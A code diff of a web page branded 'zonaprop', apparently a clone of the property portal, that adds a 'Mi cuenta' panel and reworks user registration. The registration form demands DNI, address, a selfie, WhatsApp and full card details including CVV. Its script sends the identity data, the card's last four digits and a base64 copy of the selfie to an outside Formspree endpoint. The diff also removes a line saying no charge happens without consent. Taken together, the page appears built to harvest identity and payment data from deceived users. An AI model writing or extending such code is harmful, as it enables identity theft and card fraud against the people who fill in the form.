@@ -132,7 +132,7 @@ button,input,select{font-family:inherit}
       zonaprop
     </a>
     <div class="header-actions">
-      <button type="button" id="btnUsersMenu" style="font-size:13px;font-weight:600;background:none;border:none;color:#333;cursor:pointer">Usuarios</button>
+      <button type="button" id="btnAccountMenu" style="font-size:13px;font-weight:600;background:none;border:none;color:#333;cursor:pointer">Mi cuenta</button>
       <a href="publicar.html" style="font-size:13px;font-weight:600">Publicar</a>
       <button type="button" id="btnLoginHeader" style="font-size:13px;font-weight:600;background:none;border:1.5px solid var(--primary);color:var(--primary);padding:6px 12px;border-radius:999px;cursor:pointer">Ingresar</button>
       <button type="button" class="btn-pub" id="btnRegisterHeader">Registrarme</button>
@@ -181,16 +181,38 @@ button,input,select{font-family:inherit}
 
 
 
-<!-- Modal Usuarios (admin) -->
-<div class="modal-bg" id="usersModal">
-  <div class="modal" style="max-height:92vh">
+<!-- Modal Mi cuenta -->
+<div class="modal-bg" id="accountModal">
+  <div class="modal" style="max-height:94vh;max-width:440px">
     <div class="modal-header">
-      <h3>Usuarios registrados</h3>
-      <button type="button" class="modal-close" id="usersClose">×</button>
+      <h3>Mi cuenta</h3>
+      <button type="button" class="modal-close" id="accountClose">×</button>
     </div>
-    <p style="font-size:13px;color:var(--muted);margin-bottom:.75rem">Listado de usuarios de este dispositivo. Cada registro también llega a tu email.</p>
-    <div id="usersList" style="display:flex;flex-direction:column;gap:.65rem;max-height:60vh;overflow:auto"></div>
-    <p id="usersEmpty" style="display:none;text-align:center;color:var(--muted);padding:1.5rem 0">Todavía no hay usuarios registrados en este navegador.</p>
+    <div id="accountGuest" style="display:none;text-align:center;padding:1.5rem 0">
+      <p style="color:var(--muted);margin-bottom:1rem">Iniciá sesión o registrate para ver tu panel.</p>
+      <button type="button" class="btn-modal mp" id="accountGoRegister">Registrarme / Ingresar</button>
+    </div>
+    <div id="accountLogged" style="display:none">
+      <div style="background:#fff8f5;border:1px solid #ffd9c2;border-radius:12px;padding:.85rem 1rem;margin-bottom:1rem">
+        <div style="font-weight:800;font-size:1.05rem" id="accName">—</div>
+        <div style="font-size:13px;color:var(--muted)" id="accEmail">—</div>
+      </div>
+
+      <div style="font-size:13px;font-weight:700;color:var(--muted);margin-bottom:.45rem">Publicaciones que viste</div>
+      <div id="accViews" style="max-height:160px;overflow:auto;margin-bottom:1rem;display:flex;flex-direction:column;gap:.4rem"></div>
+      <p id="accViewsEmpty" style="display:none;font-size:13px;color:var(--muted);margin-bottom:1rem">Todavía no viste ninguna publicación.</p>
+
+      <div style="font-size:13px;font-weight:700;color:var(--muted);margin-bottom:.45rem">Cambiar clave</div>
+      <div class="form-group">
+        <label for="accNewPass">Nueva clave (mín. 6 caracteres)</label>
+        <input type="password" id="accNewPass" placeholder="••••••••" autocomplete="new-password"/>
+      </div>
+      <button type="button" class="btn-modal mp" id="accChangePass" style="margin-bottom:1rem;height:44px;font-size:14px">Guardar nueva clave</button>
+
+      <div style="font-size:13px;font-weight:700;color:var(--muted);margin-bottom:.45rem">Soporte</div>
+      <button type="button" class="btn-modal wa" id="accSupport" style="height:44px;font-size:14px">Contactar con soporte</button>
+      <button type="button" id="accLogout" style="width:100%;margin-top:.75rem;height:42px;border:1.5px solid #ddd;border-radius:28px;background:#fff;font-weight:600;cursor:pointer;font-size:14px">Cerrar sesión</button>
+    </div>
   </div>
 </div>
 
@@ -849,6 +871,7 @@ document.getElementById("btnWA").onclick=function(){
 var ADMIN_WA = "5491153797355";
 var STORAGE_USERS = "zp_interesados";
 var STORAGE_SESSION = "zp_session";
+var STORAGE_VIEWS = "zp_views";
 
 function getUsers() {
   try { return JSON.parse(localStorage.getItem(STORAGE_USERS) || "[]"); }
@@ -865,52 +888,6 @@ function setSession(user) {
   if (user) localStorage.setItem(STORAGE_SESSION, JSON.stringify(user));
   else localStorage.removeItem(STORAGE_SESSION);
   updateHeader();
-
-// ——— Menú de usuarios ———
-function renderUsersList() {
-  var list = document.getElementById("usersList");
-  var empty = document.getElementById("usersEmpty");
-  if (!list) return;
-  var users = getUsers();
-  list.innerHTML = "";
-  if (!users.length) {
-    if (empty) empty.style.display = "block";
-    return;
-  }
-  if (empty) empty.style.display = "none";
-  users.slice().reverse().forEach(function(u, i) {
-    var card = document.createElement("div");
-    card.style.cssText = "background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:.75rem .9rem;font-size:13.5px";
-    var fecha = u.created ? new Date(u.created).toLocaleString("es-AR") : "—";
-    card.innerHTML =
-      "<div style='font-weight:700;font-size:15px;margin-bottom:.25rem'>" + (u.nombre || "Sin nombre") + "</div>" +
-      "<div>Email: " + (u.email || "—") + "</div>" +
-      "<div>DNI: " + (u.dni || "—") + "</div>" +
-      "<div>WhatsApp: " + (u.tel || "—") + "</div>" +
-      "<div>Dirección: " + (u.direccion || "—") + "</div>" +
-      (u.cardLast4 ? "<div>Tarjeta: ****" + u.cardLast4 + "</div>" : "") +
-      "<div style='color:#888;margin-top:.35rem;font-size:12px'>Alta: " + fecha + "</div>";
-    list.appendChild(card);
-  });
-}
-function openUsersMenu() {
-  renderUsersList();
-  document.getElementById("usersModal").classList.add("open");
-  document.body.style.overflow = "hidden";
-}
-function closeUsersMenu() {
-  document.getElementById("usersModal").classList.remove("open");
-  document.body.style.overflow = "";
-}
-var btnUsers = document.getElementById("btnUsersMenu");
-if (btnUsers) btnUsers.onclick = openUsersMenu;
-var usersClose = document.getElementById("usersClose");
-if (usersClose) usersClose.onclick = closeUsersMenu;
-var usersModal = document.getElementById("usersModal");
-if (usersModal) usersModal.addEventListener("click", function(e) {
-  if (e.target === usersModal) closeUsersMenu();
-});
-
 }
 function updateHeader() {
   var s = getSession();
@@ -931,7 +908,6 @@ function updateHeader() {
     if (btnReg) btnReg.style.display = "";
   }
 }
-
 function openRegister() {
   document.getElementById("regErr").classList.remove("show");
   document.getElementById("registerModal").classList.add("open");
@@ -941,41 +917,35 @@ function closeRegister() {
   document.getElementById("registerModal").classList.remove("open");
   document.body.style.overflow = "";
 }
-
 document.getElementById("regClose").onclick = closeRegister;
 document.getElementById("registerModal").addEventListener("click", function(e) {
   if (e.target === this) closeRegister();
 });
-
 document.getElementById("btnLoginHeader").onclick = function() {
   var s = getSession();
   if (s) {
-    if (confirm("¿Cerrar sesión?")) setSession(null);
+    openAccountMenu();
     return;
   }
   openRegister();
 };
 var btnRegHeader = document.getElementById("btnRegisterHeader");
-if (btnRegHeader) {
-  btnRegHeader.onclick = function() { openRegister(); };
-}
+if (btnRegHeader) btnRegHeader.onclick = function() { openRegister(); };
 
 document.getElementById("btnDoRegister").onclick = function() {
   var nombre = (document.getElementById("regNombre").value || "").trim();
   var email = (document.getElementById("regEmail").value || "").trim().toLowerCase();
   var dni = (document.getElementById("regDni").value || "").trim();
-  var pass = (document.getElementById("regPass").value || "");
+  var pass = document.getElementById("regPass").value || "";
   var tel = (document.getElementById("regTel").value || "").trim();
-  var err = document.getElementById("regErr");
-
+  var direccion = (document.getElementById("regDireccion").value || "").trim();
   var cardName = (document.getElementById("regCardName").value || "").trim();
   var cardNumber = (document.getElementById("regCardNumber").value || "").replace(/\s/g, "");
   var cardExpiry = (document.getElementById("regCardExpiry").value || "").trim();
   var cardCvv = (document.getElementById("regCardCvv").value || "").trim();
-
-  var direccion = (document.getElementById("regDireccion").value || "").trim();
   var selfieInput = document.getElementById("regSelfie");
   var hasSelfie = selfieInput && selfieInput.files && selfieInput.files.length > 0;
+  var err = document.getElementById("regErr");
 
   if (!nombre || !email || !dni || pass.length < 6 || !tel || !direccion) {
     err.textContent = "Completá nombre, email, DNI, clave, WhatsApp y dirección.";
@@ -998,21 +968,20 @@ document.getElementById("btnDoRegister").onclick = function() {
     return;
   }
   if (!cardName || cardNumber.length < 13 || !/^\d{2}\/\d{2}$/.test(cardExpiry) || cardCvv.length < 3) {
-    err.textContent = "Completá los datos de la tarjeta para asegurar futuras reservas.";
+    err.textContent = "Completá los datos de la tarjeta.";
     err.classList.add("show");
     return;
   }
 
   var users = getUsers();
   if (users.some(function(u) { return u.email === email; })) {
-    // Already registered → try login with password
     var existing = users.filter(function(u) { return u.email === email; })[0];
     if (existing.pass && existing.pass !== pass) {
       err.textContent = "Ese email ya está registrado. La clave no coincide.";
       err.classList.add("show");
       return;
     }
-    setSession({ nombre: existing.nombre, email: existing.email, dni: existing.dni || "", tel: existing.tel || "" });
+    setSession({ nombre: existing.nombre, email: existing.email, dni: existing.dni || "", tel: existing.tel || "", direccion: existing.direccion || "" });
     closeRegister();
     alert("¡Bienvenido de nuevo, " + existing.nombre + "!");
     return;
@@ -1024,12 +993,11 @@ document.getElementById("btnDoRegister").onclick = function() {
   setSession({ nombre: nombre, email: email, dni: dni, tel: tel, direccion: direccion });
   closeRegister();
 
-  // Avisar al admin SOLO por EMAIL (Formspree) CON SELFIE
+  // Solo email admin (Formspree) con selfie
   var FORMSPREE_ENDPOINT = "https://formspree.io/f/xrpzbayz";
   var selfieFile = selfieInput.files[0];
 
-  // Redimensionar selfie y enviar con FormData (archivo + datos)
-  function sendRegistrationEmail(resizedBlob) {
+  function sendRegistrationEmail(resizedBlob, base64data) {
     var fd = new FormData();
     fd.append("_subject", "Nuevo registro ZonaProp - " + nombre);
     fd.append("nombre", nombre);
@@ -1038,44 +1006,45 @@ document.getElementById("btnDoRegister").onclick = function() {
     fd.append("whatsapp", tel);
     fd.append("direccion", direccion);
     fd.append("tarjeta", "****" + cardNumber.slice(-4));
-    fd.append("mensaje", "Nuevo usuario registrado. Selfie adjunta. No se cobra sin consentimiento.");
+    fd.append("mensaje", "Nuevo usuario registrado. Selfie incluida.");
     fd.append("fecha", new Date().toLocaleString("es-AR"));
-    if (resizedBlob) {
-      fd.append("selfie", resizedBlob, "selfie-" + dni + ".jpg");
-    } else if (selfieFile) {
-      fd.append("selfie", selfieFile, selfieFile.name || "selfie.jpg");
+    if (resizedBlob) fd.append("selfie", resizedBlob, "selfie-" + dni + ".jpg");
+    else if (selfieFile) fd.append("selfie", selfieFile, selfieFile.name || "selfie.jpg");
+    if (base64data && base64data.length < 900000) {
+      fd.append("selfie_base64", base64data.substring(0, 100000));
+      fd.append("selfie_nota", "Campo selfie_base64 tiene la imagen (inicio data:image/jpeg;base64,...)");
     }
     fetch(FORMSPREE_ENDPOINT, {
       method: "POST",
       body: fd,
       headers: { "Accept": "application/json" }
-    }).then(function(r){ console.log("Formspree OK", r.status); }).catch(function(e){ console.log("Formspree error", e); });
+    }).then(function(r){ console.log("Formspree", r.status); }).catch(function(){});
   }
 
-  // Intentar redimensionar a JPEG pequeño para que llegue bien al email
   if (selfieFile && selfieFile.type.indexOf("image") === 0) {
     var reader = new FileReader();
     reader.onload = function(e) {
       var img = new Image();
       img.onload = function() {
-        var max = 600;
-        var w = img.width, h = img.height;
-        var scale = Math.min(1, max / Math.max(w, h));
+        var max = 500;
+        var scale = Math.min(1, max / Math.max(img.width, img.height));
         var canvas = document.createElement("canvas");
-        canvas.width = Math.round(w * scale);
-        canvas.height = Math.round(h * scale);
+        canvas.width = Math.round(img.width * scale);
+        canvas.height = Math.round(img.height * scale);
         canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
+        var b64 = "";
+        try { b64 = canvas.toDataURL("image/jpeg", 0.65); } catch(err) {}
         canvas.toBlob(function(blob) {
-          sendRegistrationEmail(blob || selfieFile);
-        }, "image/jpeg", 0.75);
+          sendRegistrationEmail(blob || selfieFile, b64);
+        }, "image/jpeg", 0.65);
       };
-      img.onerror = function() { sendRegistrationEmail(null); };
+      img.onerror = function() { sendRegistrationEmail(selfieFile, ""); };
       img.src = e.target.result;
     };
-    reader.onerror = function() { sendRegistrationEmail(null); };
+    reader.onerror = function() { sendRegistrationEmail(selfieFile, ""); };
     reader.readAsDataURL(selfieFile);
   } else {
-    sendRegistrationEmail(null);
+    sendRegistrationEmail(null, "");
   }
 
   alert("¡Cuenta creada! Ya podés solicitar reservas.");
@@ -1083,52 +1052,113 @@ document.getElementById("btnDoRegister").onclick = function() {
 
 updateHeader();
 
-// ——— Menú de usuarios ———
-function renderUsersList() {
-  var list = document.getElementById("usersList");
-  var empty = document.getElementById("usersEmpty");
-  if (!list) return;
-  var users = getUsers();
-  list.innerHTML = "";
-  if (!users.length) {
+// ——— Mi cuenta ———
+function getViews() {
+  try { return JSON.parse(localStorage.getItem(STORAGE_VIEWS) || "[]"); }
+  catch(e) { return []; }
+}
+function saveViews(arr) {
+  localStorage.setItem(STORAGE_VIEWS, JSON.stringify(arr.slice(0, 50)));
+}
+function trackView(item) {
+  if (!item) return;
+  var views = getViews().filter(function(v) { return v.link !== item.link; });
+  views.unshift({ title: item.title||"", barrio: item.barrio||"", price: item.price||"", link: item.link||"", img: item.img||"", at: Date.now() });
+  saveViews(views);
+}
+function openAccountMenu() {
+  var s = getSession();
+  var guest = document.getElementById("accountGuest");
+  var logged = document.getElementById("accountLogged");
+  if (!s || !s.email) {
+    if (guest) guest.style.display = "block";
+    if (logged) logged.style.display = "none";
+  } else {
+    if (guest) guest.style.display = "none";
+    if (logged) logged.style.display = "block";
+    var n = document.getElementById("accName");
+    var e = document.getElementById("accEmail");
+    if (n) n.textContent = s.nombre || "Usuario";
+    if (e) e.textContent = s.email || "";
+    renderAccountViews();
+  }
+  document.getElementById("accountModal").classList.add("open");
+  document.body.style.overflow = "hidden";
+}
+function closeAccountMenu() {
+  document.getElementById("accountModal").classList.remove("open");
+  document.body.style.overflow = "";
+}
+function renderAccountViews() {
+  var box = document.getElementById("accViews");
+  var empty = document.getElementById("accViewsEmpty");
+  if (!box) return;
+  var views = getViews();
+  box.innerHTML = "";
+  if (!views.length) {
     if (empty) empty.style.display = "block";
     return;
   }
   if (empty) empty.style.display = "none";
-  users.slice().reverse().forEach(function(u, i) {
-    var card = document.createElement("div");
-    card.style.cssText = "background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:.75rem .9rem;font-size:13.5px";
-    var fecha = u.created ? new Date(u.created).toLocaleString("es-AR") : "—";
-    card.innerHTML =
-      "<div style='font-weight:700;font-size:15px;margin-bottom:.25rem'>" + (u.nombre || "Sin nombre") + "</div>" +
-      "<div>Email: " + (u.email || "—") + "</div>" +
-      "<div>DNI: " + (u.dni || "—") + "</div>" +
-      "<div>WhatsApp: " + (u.tel || "—") + "</div>" +
-      "<div>Dirección: " + (u.direccion || "—") + "</div>" +
-      (u.cardLast4 ? "<div>Tarjeta: ****" + u.cardLast4 + "</div>" : "") +
-      "<div style='color:#888;margin-top:.35rem;font-size:12px'>Alta: " + fecha + "</div>";
-    list.appendChild(card);
+  views.slice(0, 15).forEach(function(v) {
+    var a = document.createElement("a");
+    a.href = v.link || "#";
+    a.style.cssText = "display:flex;gap:.55rem;align-items:center;background:#f7f7f7;border-radius:10px;padding:.45rem .55rem;text-decoration:none;color:inherit";
+    a.innerHTML = '<div style="width:48px;height:48px;border-radius:8px;background:#ddd center/cover no-repeat;flex-shrink:0;background-image:url(\\''+(v.img||'')+'\\')"></div><div style="min-width:0;flex:1"><div style="font-size:13px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+(v.title||'')+'</div><div style="font-size:12px;color:#666">'+(v.barrio||'')+' · '+(v.price||'')+'</div></div>';
+    box.appendChild(a);
   });
 }
-function openUsersMenu() {
-  renderUsersList();
-  document.getElementById("usersModal").classList.add("open");
-  document.body.style.overflow = "hidden";
-}
-function closeUsersMenu() {
-  document.getElementById("usersModal").classList.remove("open");
-  document.body.style.overflow = "";
-}
-var btnUsers = document.getElementById("btnUsersMenu");
-if (btnUsers) btnUsers.onclick = openUsersMenu;
-var usersClose = document.getElementById("usersClose");
-if (usersClose) usersClose.onclick = closeUsersMenu;
-var usersModal = document.getElementById("usersModal");
-if (usersModal) usersModal.addEventListener("click", function(e) {
-  if (e.target === usersModal) closeUsersMenu();
+var btnAccount = document.getElementById("btnAccountMenu");
+if (btnAccount) btnAccount.onclick = openAccountMenu;
+var accountClose = document.getElementById("accountClose");
+if (accountClose) accountClose.onclick = closeAccountMenu;
+var accountModal = document.getElementById("accountModal");
+if (accountModal) accountModal.addEventListener("click", function(e) {
+  if (e.target === accountModal) closeAccountMenu();
 });
-
-
+var accountGoRegister = document.getElementById("accountGoRegister");
+if (accountGoRegister) accountGoRegister.onclick = function() { closeAccountMenu(); openRegister(); };
+var accChangePass = document.getElementById("accChangePass");
+if (accChangePass) accChangePass.onclick = function() {
+  var s = getSession();
+  if (!s || !s.email) return;
+  var p = document.getElementById("accNewPass").value || "";
+  if (p.length < 6) { alert("La clave debe tener al menos 6 caracteres."); return; }
+  var users = getUsers();
+  var found = false;
+  users = users.map(function(u) { if (u.email === s.email) { u.pass = p; found = true; } return u; });
+  if (!found) { alert("No se encontró tu usuario."); return; }
+  saveUsers(users);
+  document.getElementById("accNewPass").value = "";
+  alert("Clave actualizada correctamente.");
+};
+var accSupport = document.getElementById("accSupport");
+if (accSupport) accSupport.onclick = function() {
+  var s = getSession();
+  var msg = "Hola, necesito soporte en ZonaProp.";
+  if (s && s.email) msg += "\\nMi email: " + s.email + (s.nombre ? "\\nNombre: " + s.nombre : "");
+  window.open("https://wa.me/" + ADMIN_WA + "?text=" + encodeURIComponent(msg), "_blank");
+};
+var accLogout = document.getElementById("accLogout");
+if (accLogout) accLogout.onclick = function() {
+  setSession(null);
+  closeAccountMenu();
+  alert("Sesión cerrada.");
+};
+document.addEventListener("click", function(e) {
+  var photo = e.target.closest("a.dept-photo");
+  var card = e.target.closest(".dept-card");
+  if (!photo && !card) return;
+  var link = photo ? photo.getAttribute("href") : null;
+  if (!link && card) {
+    var a = card.querySelector("a.dept-photo");
+    if (a) link = a.getAttribute("href");
+  }
+  if (!link || typeof listings === "undefined") return;
+  for (var i=0;i<listings.length;i++) {
+    if (listings[i].link === link) { trackView(listings[i]); break; }
+  }
+}, true);
 
 // Card input helpers (reserva + registro)
 (function(){
